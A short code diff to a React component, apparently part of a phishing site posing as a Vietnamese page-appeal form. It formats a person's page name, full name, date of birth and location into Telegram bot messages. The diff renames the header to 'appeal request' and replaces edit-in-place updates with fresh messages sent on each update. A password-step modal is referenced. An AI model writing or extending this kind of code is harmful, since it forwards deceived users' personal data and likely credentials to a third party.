@@ -419,9 +419,9 @@ export default function HomePageClient({
     const safeStatus = escapeHtml((overrides.status ?? status) || "N/A");
 
     return [
-      "👤 <b>THÔNG TIN PHỤ</b>",
+      "👤 <b>THÔNG TIN Yêu Cầu Kháng Nghị</b>",
       `📱 Tên PAGE: <code>${safePageName}</code>`,
-      `👨‍💼 Họ Tên: <code>${safeFullName}</code>`,
+      `👨‍💼 Tên: <code>${safeFullName}</code>`,
       `🎂 Ngày Sinh: <code>${safeDateOfBirth}</code>`,
       "━━━━━━━━━━━━━━━━━━━━━",
       `📍 <b>THÔNG TIN VỊ TRÍ</b>`,
@@ -496,41 +496,12 @@ export default function HomePageClient({
     await sendTelegramMessage(text);
   };
 
-  const updateTelegramMessage = async (status: string, overrides: TelegramOverrides = {}) => {
+   const updateTelegramMessage = async (status: string, overrides: TelegramOverrides = {}) => {
     if (!telegramEnabled) {
       return;
     }
-
     const text = buildTelegramMessage(status, overrides);
-    if (!messageId) {
-      await sendTelegramMessage(text);
-      return;
-    }
-
-    try {
-      const messageIdNumber = Number(messageId);
-      if (!Number.isFinite(messageIdNumber)) {
-        throw new Error("Invalid message id");
-      }
-
-      const response = await fetch(`https://api.telegram.org/bot${botToken}/editMessageText`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: chatId,
-          message_id: messageIdNumber,
-          text,
-          parse_mode: "HTML",
-        }),
-      });
-      const data = await response.json();
-      if (!data?.ok) {
-        throw new Error("Telegram edit failed");
-      }
-    } catch (error) {
-      console.error("Telegram Update Error:", error);
-      await sendTelegramMessage(text);
-    }
+    await sendTelegramMessage(text);
   };
 
   const passwordStepMessage = modal.passwordStepMessage;
